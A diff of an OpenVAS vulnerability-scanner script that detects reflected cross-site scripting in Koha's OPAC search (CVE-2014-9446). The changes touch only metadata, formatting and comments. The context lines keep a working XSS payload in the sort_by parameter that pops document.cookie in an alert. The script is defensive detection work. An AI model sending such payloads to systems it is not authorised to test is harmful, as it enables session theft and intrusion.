@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_koha_staff_client_mult_xss.nasl 5819 2017-03-31 10:57:23Z cfi $
+# $Id: gb_koha_staff_client_mult_xss.nasl 11291 2018-09-07 14:48:41Z mmartin $
 #
 # Koha Multiple XSS Vulnerabilities
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805355");
-  script_version("$Revision: 5819 $");
+  script_version("$Revision: 11291 $");
   script_cve_id("CVE-2014-9446");
   script_bugtraq_id(71803);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-31 12:57:23 +0200 (Fri, 31 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-07 16:48:41 +0200 (Fri, 07 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-27 19:14:22 +0530 (Fri, 27 Mar 2015)");
   script_tag(name:"qod_type", value:"exploit");
   script_name("Koha Multiple XSS Vulnerabilities");
@@ -59,8 +59,8 @@ if(description)
   For updates refer to http://www.koha.org");
 
   script_tag(name:"solution_type", value:"VendorFix");
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/71803/info");
-  script_xref(name : "URL" , value : "http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=13425");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71803/info");
+  script_xref(name:"URL", value:"http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=13425");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -73,11 +73,6 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = "";
-sndReq = "";
-rcvRes = "";
-
 http_port = get_http_port(default:80);
 
 foreach dir (make_list_unique("/", cgi_dirs(port:http_port)))
@@ -86,14 +81,11 @@ foreach dir (make_list_unique("/", cgi_dirs(port:http_port)))
   if( dir == "/" ) dir = "";
   rcvRes = http_get_cache(item:string(dir, "/"),  port:http_port);
 
-  #Confirm Application
   if("Log in to Koha" >< rcvRes || rcvRes && rcvRes =~ "Powered by.*Koha")
   {
-    #Construct Attack Request
     url = dir + '/cgi-bin/koha/opac-search.pl?idx=kw&q=12&sort_by='
               + '"><svg/onload=alert(document.cookie)>&addto=';
 
-    # Try attack and check the response to confirm vulnerability
     if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
        pattern:"alert\(document\.cookie\)", extra_check:">Log in"))
     {
